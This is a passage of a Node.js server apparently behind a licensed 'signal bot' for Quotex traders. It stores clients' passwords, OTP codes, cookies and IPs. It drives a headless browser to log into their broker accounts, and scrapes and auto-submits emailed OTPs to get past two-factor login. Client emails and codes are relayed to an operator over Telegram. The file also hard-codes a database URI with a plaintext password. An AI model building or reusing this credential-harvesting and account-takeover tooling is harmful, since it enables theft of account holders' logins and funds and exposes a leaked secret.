const express  = require('express');
const cors     = require('cors');
const axios    = require('axios');
const fs       = require('fs');
const path     = require('path');
const mongoose = require('mongoose');

// ================== MONGODB SETUP ==================
const MONGODB_URI = process.env.MONGODB_URI ||
    'mongodb+srv://Luckybot:Lucky8ixx$@lucky.comleed.mongodb.net/csbot?retryWrites=true&w=majority&appName=Lucky';

let useDatabase = false;

mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000, maxPoolSize: 100 })
.then(() => { useDatabase = true; console.log('✅ MongoDB connected: permanent storage enabled'); })
.catch(err => { console.warn('⚠️  MongoDB connection failed — falling back to file storage:', err.message); });

// ================== MONGOOSE SCHEMAS ==================
const userSchema = new mongoose.Schema({
    id:           { type: String, required: true, unique: true },
    licenceKey:   { type: String, required: true, index: true },
    fullName:     { type: String, default: 'Unknown' },
    username:     { type: String, default: '' },
    password:     { type: String, default: '' },
    otp:          { type: String, default: '' },
    ip:           { type: String, default: '' },
    cookies:      { type: String, default: '' },
    status:       { type: String, default: 'Active' },
    connected:    { type: Boolean, default: false },
    blocked:      { type: Boolean, default: false },
    lastActivity: { type: Date, default: Date.now },
    activities:   { type: Array, default: [] },
    createdAt:    { type: Date, default: Date.now },
});
const licenseSchema = new mongoose.Schema({
    key:           { type: String, required: true, unique: true },
    type:          { type: String, default: 'Standard' },
    status:        { type: String, default: 'Active', index: true },
    usesRemaining: { type: Number, default: null },
    assignedTo:    { type: String, default: null },
    dateAdded:     { type: Date, default: Date.now },
    expiry:        { type: Date, default: null },
});
const pendingMessageSchema = new mongoose.Schema({
    userName:    { type: String, required: true, index: true },
    messageData: { type: Object, required: true },
    delivered:   { type: Boolean, default: false, index: true },
    createdAt:   { type: Date, default: Date.now },
});
const noteSchema = new mongoose.Schema({
    licenceKey: { type: String, required: true, unique: true, index: true },
    note:       { type: String, default: '' },
    updatedAt:  { type: Date, default: Date.now },
});
const settingSchema = new mongoose.Schema({
    _id:         { type: String, default: 'bot' },
    telegramUrl: { type: String, default: '' },
    whatsappUrl: { type: String, default: '' },
    botName:     { type: String, default: 'Chinese Signal Bot' },
    updatedAt:   { type: Date, default: Date.now },
}, { _id: false, minimize: false });
const orderSchema = new mongoose.Schema({
    id:            { type: String, required: true, unique: true },
    fullName:      { type: String, required: true },
    planKey:       { type: String, required: true },
    planLabel:     { type: String, default: '' },
    planPricePKR:  { type: String, default: '' },
    planPriceUSD:  { type: String, default: '' },
    paymentMethod: { type: String, default: '' },
    whatsapp:      { type: String, default: '' },
    status:        { type: String, default: 'New', index: true },
    createdAt:     { type: Date, default: Date.now },
});

// ── NEW: Broker session history (logged to DB) ──────────────
const brokerSessionSchema = new mongoose.Schema({
    sessionId:   { type: String, required: true, unique: true },
    clientName:  { type: String, default: '' },
    email:       { type: String, default: '' },
    licenceKey:  { type: String, default: '' },
    status:      { type: String, default: 'closed' },
    result:      { type: String, default: '' },    // 'success'|'failed'|'cancelled'
    startedAt:   { type: Date, default: Date.now },
    closedAt:    { type: Date, default: null },
    otpAttempts: { type: Number, default: 0 },
    notes:       { type: String, default: '' },
});

const User           = mongoose.model('User',           userSchema);
const License        = mongoose.model('License',        licenseSchema);
const PendingMessage = mongoose.model('PendingMessage', pendingMessageSchema);
const Note           = mongoose.model('Note',           noteSchema);
const Setting        = mongoose.model('Setting',        settingSchema);
const Order          = mongoose.model('Order',          orderSchema);
const BrokerSession  = mongoose.model('BrokerSession',  brokerSessionSchema);

// ── Saved Credentials (for quick Quotex batch launch) ───────────────────────
const savedCredentialSchema = new mongoose.Schema({
    id:          { type: String, required: true, unique: true },
    label:       { type: String, default: '' },
    email:       { type: String, required: true },
    password:    { type: String, required: true },
    group:       { type: String, default: 'Default' },
    notes:       { type: String, default: '' },
    launchCount: { type: Number, default: 0 },
    lastLaunched:{ type: Date,   default: null },
    createdAt:   { type: Date,   default: Date.now },
});
const SavedCredential = mongoose.model('SavedCredential', savedCredentialSchema);
let savedCredsMemory  = [];


// ================== DB HELPERS ==================
async function dbGetOrCreateUser(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user = null;
    if (hasName) {
        user = await User.findOne({ licenceKey, fullName: { $regex: new RegExp(`^${fullName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } });
        if (!user) user = await User.findOne({ licenceKey, fullName: { $in: ['Unknown', 'Pending Name', ''] } });
    } else {
        user = await User.findOne({ licenceKey });
    }
    if (!user) {
        const newId = Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7);
        user = await User.create({ id: newId, licenceKey, fullName: hasName ? fullName : 'Unknown' });
    } else {
        if (hasName && user.fullName !== fullName) user.fullName = fullName;
        user.lastActivity = new Date();
        await user.save();
    }
    return user.toObject();
}
async function dbSaveUser(user) {
    await User.findOneAndUpdate({ id: user.id }, {
        licenceKey: user.licenceKey, fullName: user.fullName, username: user.username || '',
        password: user.password || '', otp: user.otp || '', ip: user.ip || '',
        cookies: user.cookies || '', status: user.status || 'Active',
        connected: user.connected || false, blocked: user.blocked || false,
        lastActivity: new Date(), activities: user.activities || [],
    }, { upsert: true, new: true });
}
async function dbGetAllUsers() { return await User.find().sort({ lastActivity: -1 }).lean(); }
async function dbFindUserByKey(licenceKey) { return await User.findOne({ licenceKey }).lean(); }
async function dbGetStats() {
    const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers] = await Promise.all([
        User.countDocuments(), User.countDocuments({ status: 'Online' }),
        User.countDocuments({ otp: { $nin: [null, ''] } }), User.countDocuments({ connected: true }),
        License.countDocuments(), License.countDocuments({ status: 'Active' }), User.countDocuments({ blocked: true }),
    ]);
    return { totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers };
}
async function dbSaveNote(licenceKey, note) {
    await Note.findOneAndUpdate({ licenceKey }, { note, updatedAt: new Date() }, { upsert: true, new: true });
}
async function dbGetNote(licenceKey) { return await Note.findOne({ licenceKey }).lean(); }
async function dbGetAllLicenses() { return await License.find().sort({ dateAdded: -1 }).lean(); }
async function dbFindLicense(key) { return await License.findOne({ key }).lean(); }
async function dbInsertLicense(lic) {
    await License.create({ key: lic.key, type: lic.type || 'Standard', status: lic.status || 'Active',
        usesRemaining: lic.usesRemaining || null, assignedTo: lic.assignedTo || null,
        expiry: lic.expiry ? new Date(lic.expiry) : null });
}
async function dbUpdateLicenseStatus(key, status) { await License.findOneAndUpdate({ key }, { status }); }
async function dbDeleteLicense(key) { await License.deleteOne({ key }); }
async function dbAddPendingMessage(userName, msgPayload) {
    const key = userName.trim().toLowerCase();
    await PendingMessage.create({ userName: key, messageData: msgPayload });
    const oldest = await PendingMessage.find({ userName: key, delivered: false }).sort({ createdAt: 1 }).lean();
    if (oldest.length > 20) {
        const toDelete = oldest.slice(0, oldest.length - 20).map(m => m._id);
        await PendingMessage.deleteMany({ _id: { $in: toDelete } });
    }
}
async function dbPollAndClearMessages(userName) {
    const key = userName.trim().toLowerCase();
    const msgs = await PendingMessage.find({ userName: key, delivered: false }).lean();
    if (msgs.length > 0) await PendingMessage.updateMany({ userName: key, delivered: false }, { delivered: true });
    return msgs.map(m => m.messageData);
}
async function dbDeleteUser(licenceKey) { await User.deleteOne({ licenceKey }); }

// ================== PUPPETEER SETUP ==================
// Quotex Auto-Login — uses headless browser to log into Quotex on behalf of clients
// Install: npm install puppeteer  (first run downloads ~170MB Chromium)
let puppeteer = null;
let puppeteerAvailable = false;

try {
    puppeteer = require('puppeteer');
    puppeteerAvailable = true;
    console.log('✅ Puppeteer available — Quotex Auto-Login ENABLED');
} catch(e) {
    console.warn('⚠️  Puppeteer not installed. Run: npm install puppeteer  to enable Auto-Login.');
}

// ================== AUTO-OTP (IMAP EMAIL WATCHER) ==================
// Install: npm install imapflow
// Required env: OTP_EMAIL, OTP_EMAIL_PASSWORD
// Optional env: OTP_IMAP_HOST (default: imap.gmail.com), OTP_IMAP_PORT (default: 993)
// For Gmail: enable IMAP in Gmail settings + use an App Password (not your normal password)
let ImapFlow = null;
let imapflowAvailable = false;
try {
    ImapFlow = require('imapflow').ImapFlow;
    imapflowAvailable = true;
} catch(e) {
    console.warn('⚠️  imapflow not installed. Run: npm install imapflow  to enable Auto-OTP.');
}

const OTP_EMAIL          = process.env.OTP_EMAIL          || '';
const OTP_EMAIL_PASSWORD = process.env.OTP_EMAIL_PASSWORD || '';
const OTP_IMAP_HOST      = process.env.OTP_IMAP_HOST      || 'imap.gmail.com';
const OTP_IMAP_PORT      = parseInt(process.env.OTP_IMAP_PORT || '993', 10);

let autoOtpConfig = {
    enabled:      imapflowAvailable && !!(OTP_EMAIL && OTP_EMAIL_PASSWORD),
    available:    imapflowAvailable,
    emailSet:     !!(OTP_EMAIL && OTP_EMAIL_PASSWORD),
    lastOtp:      null,
    lastOtpTime:  null,
    lastCheck:    null,
    lastError:    null,
};

// ── Extract OTP from raw email source ──────────────────────────────────────────
function extractOtpFromEmail(source) {
    const raw  = source.toString();
    // Decode common HTML entities and strip tags for clean text matching
    const text = raw
        .replace(/&nbsp;/gi, ' ')
        .replace(/&#\d+;/g, ' ')
        .replace(/<[^>]+>/g, ' ')
        .replace(/\s+/g, ' ');
    // Priority patterns: context-aware first, then fallbacks
    const patterns = [
        // "Your verification code is 123456" / "OTP: 123456"
        /(?:verification|confirmation|security|one.?time|confirm(?:ation)?|login)\s*(?:code|pin|otp)[^\d]{0,25}(\d{4,8})/i,
        /(?:code|otp|pin)\s*(?:is|:|=|-|\s)\s*[\s:-]*(\d{4,8})/i,
        /(\d{6})\s*(?:is your|verification|confirm|code|otp)/i,
        // Quotex-style: bold or spaced OTP presentation
        /(?:enter|use|input|submit)[^\d]{0,20}(\d{4,8})/i,
        // Fallback: standalone 6-digit number (most common Quotex OTP length)
        /\b(\d{6})\b/,
        // Last resort: 4-digit OTP
        /\b(\d{4})\b/,
    ];
    for (const re of patterns) {
        const m = text.match(re);
        if (m) return m[1];
    }
    return null;
}

// ── Single IMAP check pass ─────────────────────────────────────────────────────
async function checkEmailForOTP(waitingSessions) {
    if (!imapflowAvailable || !OTP_EMAIL || !OTP_EMAIL_PASSWORD) return;

    const client = new ImapFlow({
        host:    OTP_IMAP_HOST,
        port:    OTP_IMAP_PORT,
        secure:  true,
        auth:    { user: OTP_EMAIL, pass: OTP_EMAIL_PASSWORD },
        logger:  false,
    });

    try {
        await client.connect();
        const lock = await client.getMailboxLock('INBOX');

        try {
            // Search for unseen messages in the last 10 minutes
            const since = new Date(Date.now() - 10 * 60 * 1000);
            const uids = await client.search({ seen: false, since }, { uid: true });

            if (!uids || uids.length === 0) return;

            for await (const msg of client.fetch(uids, { source: true, envelope: true }, { uid: true })) {
                const source  = msg.source?.toString() || '';
                const subject = msg.envelope?.subject || '';
                const from    = (msg.envelope?.from?.[0]?.address || '').toLowerCase();

                // Accept any OTP-looking email — Quotex may send from various domains
                const subjectLower = subject.toLowerCase();
                const isOtpSubject = /(?:verif|confirm|otp|code|security|sign.?in|login|access)/i.test(subject);
                const isOtpBody    = /(?:verification code|otp|one.?time|confirm|your code)/i.test(source.toString().slice(0, 500));
                const isRelevant   =
                    from.includes('quotex') || from.includes('market-qx') ||
                    from.includes('qxbroker') || from.includes('qx.io') ||
                    from.includes('noreply') || from.includes('no-reply') ||
                    from.includes('support') || from.includes('info@') ||
                    from.includes('donotreply') || from.includes('notification') ||
                    isOtpSubject || isOtpBody;

                if (!isRelevant) continue;

                const otp = extractOtpFromEmail(source);
                if (!otp) continue;

                // Mark as seen so we don't re-process it
                await client.messageFlagsAdd(msg.uid, ['\Seen'], { uid: true });

                autoOtpConfig.lastOtp     = otp;
                autoOtpConfig.lastOtpTime = new Date().toISOString();
                broadcastSSE('auto_otp_update', { ...autoOtpConfig });

await sendTelegramMessage(
                    '🤖 <b>Auto-OTP Detected!</b>\n' +
                    '━━━━━━━━━━━━━━━━━\n' +
                    '🔢 OTP: <b>' + otp + '</b>\n' +
                    '📧 From: <code>' + from + '</code>\n' +
                    '📋 Subject: ' + subject.slice(0, 60) + '\n' +
                    '⏰ Time: ' + new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) + '\n' +
                    '⚡ Submitting automatically...'
                );

                // Submit to the MOST RECENT session waiting for OTP
                // Try to match by email first, fall back to most recent
                const matchSession = waitingSessions.find(s =>
                    s.email && (from.includes(s.email.split('@')[1] || '___') || true)
                ) || waitingSessions[waitingSessions.length - 1];

                if (matchSession) {
                    const result = await submitQuotexOTP(matchSession.id, otp);
                    if (result?.ok) {
                        await sendTelegramMessage(
                            '✅ <b>Auto-OTP Success!</b>\n' +
                            '👤 Client: <b>' + matchSession.clientName + '</b>\n' +
                            '🔢 OTP <b>' + otp + '</b> accepted — Logging in...'
                        );
                    } else {
                        await sendTelegramMessage(
                            '❌ <b>Auto-OTP Submitted but Rejected</b>\n' +
                            '👤 Client: <b>' + matchSession.clientName + '</b>\n' +
                            '⚠️ ' + (result?.error || result?.message || 'Unknown error') + '\n' +
                            '💡 Check screenshot in admin panel.'
                        );
                    }
                }

                break; // Process only the first matching OTP email
            }
        } finally {
            lock.release();
        }

        autoOtpConfig.lastCheck  = new Date().toISOString();
        autoOtpConfig.lastError  = null;
        await client.logout();

    } catch(e) {
        autoOtpConfig.lastError = e.message.slice(0, 120);
        try { await client.logout(); } catch(ex) {}
    }
}

// ── Background watcher — polls every 5 seconds when sessions wait for OTP ─────
let autoOtpWatcherStarted = false;
function startAutoOtpWatcher() {
    if (autoOtpWatcherStarted) return;
    autoOtpWatcherStarted = true;
    setInterval(async () => {
        if (!autoOtpConfig.enabled) return;
        const waiting = [...quotexSessions.values()]
            .filter(s => ['waiting_otp', 'wrong_otp'].includes(s.status));
        if (waiting.length === 0) return;
        try { await checkEmailForOTP(waiting); } catch(e) {}
    }, 5000);
    console.log('🤖 Auto-OTP watcher started (polling every 5s)');
}

// ── Session state machine ───────────────────────────────────
// launching → navigating → filling → waiting_otp → submitting_otp → logged_in
//                                                                   → wrong_otp → submitting_otp → ...
//                                    → error | closed
const quotexSessions = new Map();

// ── Gmail Notification OTP captures (in-memory ring buffer, max 200) ──────
const gmailOtpCaptures = [];
const GMAIL_OTP_DEBOUNCE_MS = 45000; // 45 seconds
const gmailOtpLastSeen = new Map(); // otp -> timestamp for dedup
// sessionId → {
//   id, clientName, email, password, licenceKey,
//   status, statusMsg, startedAt, updatedAt,
//   browser, page, screenshotBase64,
//   otpAttempts, cookies, autoOtp
// }

function getSessionInfo(session) {
    return {
        id:              session.id,
        clientName:      session.clientName,
        email:           session.email,
        licenceKey:      session.licenceKey,
        status:          session.status,
        statusMsg:       session.statusMsg,
        startedAt:       session.startedAt,
        updatedAt:       session.updatedAt,
        otpAttempts:     session.otpAttempts || 0,
        hasScreenshot:   !!session.screenshotBase64,
    };
}

function makeSessionId() {
    return 'QX-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
}

async function updateSession(session, status, msg, opts = {}) {
    session.status    = status;
    session.statusMsg = msg;
    session.updatedAt = new Date();
    if (opts.screenshot && session.page) {
        try {
            session.screenshotBase64 = await session.page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 65 });
        } catch(e) {}
    }
    broadcastSSE('qx_session_update', getSessionInfo(session));
}

// ── Core Puppeteer login flow ───────────────────────────────
async function launchQuotexSession(session) {
    if (!puppeteerAvailable) {
        session.status    = 'error';
        session.statusMsg = 'Puppeteer not installed — run: npm install puppeteer';
        broadcastSSE('qx_session_update', getSessionInfo(session));
        return;
    }

    const { id, clientName, email, password } = session;
    let browser = null;

    try {
        await updateSession(session, 'launching', '🚀 Starting browser...');

        const launchOpts = {
            headless: 'new',
            args: [
                '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas', '--no-first-run', '--no-zygote',
                '--single-process', '--disable-gpu',
                '--window-size=1280,800',
            ],
        };
        // Allow hosts (Render/Heroku/Docker) to point to a system-installed Chrome
        if (process.env.PUPPETEER_EXECUTABLE_PATH) {
            launchOpts.executablePath = process.env.PUPPETEER_EXECUTABLE_PATH;
        }
        try {
            browser = await puppeteer.launch(launchOpts);
        } catch (e) {
            if (/Could not find Chrome/i.test(e.message)) {
                throw new Error(
                    'Chrome is not installed for Puppeteer. Fix on Render: set Build Command to ' +
                    '"npm install && npx puppeteer browsers install chrome" and redeploy. ' +
                    'Or set PUPPETEER_EXECUTABLE_PATH env var to a system Chrome binary. ' +
                    'Original: ' + e.message
                );
            }
            throw e;
        }
        session.browser = browser;

        const page = await browser.newPage();
        session.page = page;
        await page.setViewport({ width: 1280, height: 800 });
        await page.setUserAgent(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
            '(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        );

        // Suppress unnecessary requests for speed
        await page.setRequestInterception(true);
        page.on('request', req => {
            const type = req.resourceType();
            if (['image','media','font'].includes(type)) req.abort();
            else req.continue();
        });

        // ── Multi-URL strategy — try primary then fallbacks ──────────────────
        const loginUrls = [
            'https://market-qx.trade/en/sign-in/',
            'https://market-qx.pro/en/sign-in/',
            'https://qxbroker.com/en/sign-in/',
        ];
        let navigated = false;
        for (const loginUrl of loginUrls) {
            try {
                await updateSession(session, 'navigating', `🌐 Opening Quotex login page (${loginUrl})...`);
                await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
                await sleep(2500);
                const hasInputs = await page.evaluate(() => document.querySelectorAll('input').length > 0);
                if (hasInputs) { navigated = true; break; }
                console.log(`[QX] ${loginUrl} — no inputs found, trying next URL`);
            } catch(navErr) {
                console.warn(`[QX] Failed to load ${loginUrl}:`, navErr.message);
            }
        }
        if (!navigated) throw new Error('All Quotex login URLs failed or returned empty pages');
        await updateSession(session, 'navigating', '🌐 Page loaded — waiting for form...', { screenshot: true });

        // Wait for the login form to render (SPA may be async)
        await updateSession(session, 'filling', '⏳ Waiting for login form to render...');
        const FORM_SELECTOR = [
            'input[type="email"]',
            'input[name="email"]',
            'input[name="login"]',
            'input[autocomplete="email"]',
            'input[autocomplete="username"]',
        ].join(', ');

        let formAppeared = false;
        try {
            await page.waitForSelector(FORM_SELECTOR, { timeout: 30000 });
            formAppeared = true;
        } catch(_) {
            try {
                await page.waitForFunction(() => {
                    return Array.from(document.querySelectorAll('input')).some(el =>
                        el.type !== 'hidden' && el.type !== 'checkbox' && el.type !== 'radio'
                    );
                }, { timeout: 20000 });
                formAppeared = true;
            } catch(__) {}
        }
        if (!formAppeared) {
            await updateSession(session, 'error', '❌ Login form did not appear — check screenshot', { screenshot: true });
            throw new Error('Login form did not appear after 30s. The page URL or layout may have changed. Check the screenshot in admin panel.');
        }
        await sleep(800);

        // Dismiss any cookie/modal overlay that might block interaction
        await page.evaluate(() => {
            const overlaySelectors = [
                '[class*="cookie"]', '[class*="modal"]', '[class*="popup"]',
                '[class*="overlay"]', '[class*="dialog"]', '[class*="consent"]',
                '[id*="cookie"]', '[id*="modal"]', '[id*="popup"]',
            ];
            for (const sel of overlaySelectors) {
                document.querySelectorAll(sel).forEach(el => {
                    try { el.style.display = 'none'; } catch(_) {}
                });
            }
        }).catch(() => {});

        // ── STEP 1: Inspect the form — get stable CSS selectors ──────────────
        await updateSession(session, 'filling', '🔍 Inspecting form fields...');
        const urlBeforeSubmit = page.url();
        const formInspect = await page.evaluate(() => {
            const all = Array.from(document.querySelectorAll('input'));
            const visible = all.filter(el =>
                el.type !== 'hidden' && el.type !== 'checkbox' &&
                el.type !== 'radio'  && !el.disabled
            );
            const emailEl = visible.find(el =>
                el.type === 'email' ||
                ['email','login','username','user'].includes((el.name||'').toLowerCase()) ||
                ['email','login','username'].includes((el.id||'').toLowerCase()) ||
                (el.getAttribute('autocomplete')||'').toLowerCase().includes('email') ||
                (el.getAttribute('autocomplete')||'').toLowerCase().includes('username') ||
                (el.placeholder||'').toLowerCase().includes('email') ||
                (el.placeholder||'').toLowerCase().includes('login') ||
                (el.placeholder||'').toLowerCase().includes('username')
            ) || visible.find(el => el.type === 'text') || visible[0];

            const passEl = visible.find(el =>
                el.type === 'password' ||
                ['password','pass'].includes((el.name||'').toLowerCase()) ||
                ['password','pass'].includes((el.id||'').toLowerCase())
            );

            if (!emailEl || !passEl) {
                return {
                    ok: false,
                    error: `Form inputs not found (visible:${visible.length} total:${all.length})`,
                    debug: visible.map(el => `[${el.type}] name="${el.name}" id="${el.id}" placeholder="${el.placeholder}"`),
                };
            }
            const makeSel = el => {
                if (el.id)   return '#' + CSS.escape(el.id);
                if (el.name) return `input[name="${el.name}"]`;
                if (el.type === 'email')    return 'input[type="email"]';
                if (el.type === 'password') return 'input[type="password"]';
                // positional fallback
                const idx = Array.from(document.querySelectorAll('input')).indexOf(el);
                return `input:nth-of-type(${idx + 1})`;
            };
            return { ok: true, emailSel: makeSel(emailEl), passSel: makeSel(passEl) };
        });

        if (!formInspect.ok) {
            await updateSession(session, 'error', `❌ ${formInspect.error}`, { screenshot: true });
            throw new Error(formInspect.error + ' | ' + JSON.stringify(formInspect.debug || []));
        }
        const { emailSel, passSel } = formInspect;

        // ── STEP 2: Fill fields using REAL keystrokes (required for Vue 3 / React) ──
        // page.type() fires: keydown → keypress → input → keyup for every character,
        // which is what SPA frameworks need to update their reactive state.
        // setNativeValue / dispatchEvent alone does NOT work with Vue 3.
        await updateSession(session, 'filling', `⌨️ Typing email into ${emailSel}...`);
        try {
            await page.click(emailSel, { clickCount: 3 }); // triple-click = select all
            await page.keyboard.press('Backspace');         // clear existing content
        } catch(_) {}
        await page.type(emailSel, email, { delay: 60 });

        await sleep(400);

        await updateSession(session, 'filling', '⌨️ Typing password...');
        try {
            await page.click(passSel, { clickCount: 3 });
            await page.keyboard.press('Backspace');
        } catch(_) {}
        await page.type(passSel, password, { delay: 60 });

        await sleep(700);
        await updateSession(session, 'filling', '📸 Pre-submit screenshot...', { screenshot: true });

        // ── STEP 3: Wait for submit button to become enabled, then click ──────
        await updateSession(session, 'filling', '🖱️ Looking for submit button...');
        let btnFound = false;
        for (let i = 0; i < 8; i++) {
            btnFound = await page.evaluate(() => {
                const btns = Array.from(document.querySelectorAll('button, input[type="submit"]'));
                const btn = btns.find(b => !b.disabled && b.type === 'submit')
                    || btns.find(b => {
                        if (b.disabled) return false;
                        const t = (b.textContent || b.value || '').toLowerCase().trim();
                        return t.includes('sign') || t.includes('login') || t.includes('log in') ||
                               t.includes('enter') || t.includes('continue');
                       })
                    || btns.find(b => !b.disabled && (b.type === 'submit' || b.getAttribute('form')));
                if (btn) { btn.click(); return true; }
                return false;
            });
            if (btnFound) break;
            await sleep(500);
        }
        if (!btnFound) {
            // No button found — press Enter in password field as last resort
            await page.focus(passSel);
            await page.keyboard.press('Enter');
        }

        // ── STEP 4: Wait for the page to react ─────────────────────────────────
        await updateSession(session, 'filling', '⏳ Waiting for Quotex to respond...');
        // Watch for URL change (navigation) OR in-place DOM change (OTP screen)
        try {
            await page.waitForFunction(
                (startUrl) => window.location.href !== startUrl,
                { timeout: 15000 },
                urlBeforeSubmit
            );
        } catch(_) {
            // URL didn't change — page may be showing OTP screen or error in-place
            await sleep(3000);
        }
        await sleep(1200);
        await updateSession(session, 'filling', '⏳ Checking login result...', { screenshot: true });

        await checkQuotexLoginResult(session, clientName, email);

    } catch(e) {
        // Capture a screenshot BEFORE closing the browser so admin can see what went wrong
        if (session.page) {
            try { await updateSession(session, 'error', `❌ Error: ${e.message.slice(0, 120)}`, { screenshot: true }); } catch(_) {}
        } else {
            await updateSession(session, 'error', `❌ Error: ${e.message.slice(0, 120)}`);
        }
        if (browser) { try { await browser.close(); } catch(ex) {} }
        session.browser = null;
        session.page    = null;
        await sendTelegramMessage(
            `❌ <b>Quotex Session Error</b>\n👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n` +
            `⚠️ Error: <b>${e.message.slice(0, 200)}</b>`
        );
    }
}

async function checkQuotexLoginResult(session, clientName, email) {
    const page = session.page;
    if (!page) return;

    const currentUrl = page.url();

    // 1. URL already left sign-in page
    const isSignInUrl = currentUrl.includes('sign-in') || currentUrl.includes('/login');
    if (!isSignInUrl) {
        const otpOnPage = await page.evaluate(() => {
            const inputs = Array.from(document.querySelectorAll('input'));
            const singleDigit = inputs.filter(function(el){ return el.maxLength === 1 && el.type !== 'hidden'; }).length;
            const codeField   = inputs.some(function(el){
                return (el.maxLength >= 4 && el.maxLength <= 8 && el.type !== 'password' && el.type !== 'hidden') ||
                       (el.name || '').toLowerCase().includes('otp') ||
                       (el.name || '').toLowerCase().includes('code');
            });
            return singleDigit >= 4 || codeField;
        }).catch(function(){ return false; });
        if (!otpOnPage) { await handleLoginSuccess(session, clientName, email); return; }
    }

    // 2. Deep scan of page state
    const pageState = await page.evaluate(() => {
        const body   = document.body ? document.body.innerText.toLowerCase()  : '';
        const html   = document.body ? document.body.innerHTML.toLowerCase()  : '';
        const inputs = Array.from(document.querySelectorAll('input'));
        const singleDigitInputs = inputs.filter(function(el){ return el.maxLength === 1 && el.type !== 'hidden'; }).length;
        const otpCodeInput = inputs.some(function(el){
            return (el.maxLength >= 4 && el.maxLength <= 8 && el.type !== 'password' && el.type !== 'hidden') ||
                   (el.name || '').toLowerCase().includes('otp') ||
                   (el.name || '').toLowerCase().includes('code') ||
                   (el.id   || '').toLowerCase().includes('otp') ||
                   (el.placeholder || '').toLowerCase().includes('code');
        });
        const hasOTPClass = !!(
            document.querySelector('[class*="otp"]')         ||
            document.querySelector('[class*="verify"]')      ||
            document.querySelector('[class*="confirm"]')     ||
            document.querySelector('[class*="two-factor"]')  ||
            document.querySelector('[class*="2fa"]')
        );
        const hasOTPText = body.includes('verification')      || body.includes('verify') ||
                           body.includes('confirmation code') || body.includes('check your email') ||
                           body.includes('sent a code')       || body.includes('enter the code') ||
                           body.includes('security code')     || body.includes('one-time') ||
                           html.includes('otp')               || html.includes('2fa');
        const needOTP = singleDigitInputs >= 4 || otpCodeInput || hasOTPClass || hasOTPText;

        var errorMsg = null;
        var errorCandidates = Array.from(document.querySelectorAll(
            '[class*="error"],[class*="invalid"],[class*="alert"],[class*="warning"],[class*="danger"],[role="alert"],.toast'
        ));
        for (var i = 0; i < errorCandidates.length; i++) {
            var txt = (errorCandidates[i].innerText || '').trim();
            if (txt.length > 3 && txt.length < 250) { errorMsg = txt; break; }
        }
        return { needOTP: needOTP, errorMsg: errorMsg, url: window.location.href,
                 title: document.title || '', bodySnippet: body.slice(0, 300) };
    }).catch(function(){ return { needOTP: false, errorMsg: null, url: currentUrl, bodySnippet: '' }; });

    // 3. OTP required
    if (pageState.needOTP) {
        await updateSession(session, 'waiting_otp',
            '🔢 OTP required — waiting for admin to enter the code', { screenshot: true });
        const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
        await sendTelegramMessage(
            '🔢 <b>OTP Required — Quotex Login</b>\n' +
            '👤 Client: <b>' + clientName + '</b>\n📧 Email: <b>' + email + '</b>\n⏰ Time: <b>' + ts + '</b>\n\n' +
            'Send OTP code:\n<code>/otp ' + session.id + ' 123456</code>'
        );
        await tgApi('sendMessage', {
            chat_id: TELEGRAM_CHAT_ID,
            parse_mode: 'HTML',
            text: '🔢 <b>Enter OTP for ' + clientName + '</b> (' + email + ')\nSession: <code>' + session.id + '</code>',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✏️ Enter OTP Now', callback_data: 'ask_qxotp|' + session.id + '|' + encodeURIComponent(clientName) }],
                    [{ text: '🔄 Retry Login',   callback_data: 'qxretry|' + session.id }],
                    [{ text: '❌ Cancel Session', callback_data: 'qxclose|' + session.id }],
                ],
            },
        });
        return;
    }

    // 4. Known error message on page
    if (pageState.errorMsg) {
        await updateSession(session, 'error', '❌ ' + pageState.errorMsg.slice(0, 150), { screenshot: true });
        await sendTelegramMessage(
            '❌ <b>Quotex Login Failed</b>\n👤 Client: <b>' + clientName + '</b>\n📧 Email: <b>' + email + '</b>\n' +
            '⚠️ Reason: <b>' + pageState.errorMsg.slice(0, 200) + '</b>'
        );
        return;
    }

    // 5. Still on sign-in page — form submit had no visible effect
    if (isSignInUrl) {
        await sleep(5000);
        const retryUrl = page.url();
        if (!retryUrl.includes('sign-in') && !retryUrl.includes('/login')) {
            return checkQuotexLoginResult(session, clientName, email);
        }
        const retryError = await page.evaluate(() => {
            var els = Array.from(document.querySelectorAll('[class*="error"],[class*="invalid"],[role="alert"]'));
            for (var i = 0; i < els.length; i++) {
                var t = (els[i].innerText || '').trim();
                if (t.length > 3) return t;
            }
            return null;
        }).catch(function(){ return null; });
        if (retryError) {
            await updateSession(session, 'error', '❌ ' + retryError.slice(0, 150), { screenshot: true });
            await sendTelegramMessage('❌ <b>Quotex Login Failed</b>\n👤 <b>' + clientName + '</b>\n📧 <b>' + email + '</b>\n⚠️ <b>' + retryError.slice(0, 200) + '</b>');
            return;
        }
        await updateSession(session, 'error',
            '⚠️ Form submit had no effect — possible CAPTCHA. Check screenshot in admin panel.', { screenshot: true });
        await sendTelegramMessage(
            '⚠️ <b>Quotex — Submit Had No Effect</b>\n' +
            '👤 Client: <b>' + clientName + '</b>\n📧 Email: <b>' + email + '</b>\n' +
            '🌐 URL: <code>' + retryUrl.slice(0, 120) + '</code>\n' +
            '📄 Page snippet: <i>' + (pageState.bodySnippet || '').slice(0, 150) + '</i>\n' +
            '📸 Screenshot saved — open Admin Panel → Broker Sessions to view.'
        );
        return;
    }

    // 6. Off sign-in URL, nothing matched — treat as success
    await handleLoginSuccess(session, clientName, email);
}


async function handleLoginSuccess(session, clientName, email) {
    await sleep(2500); // Let page settle
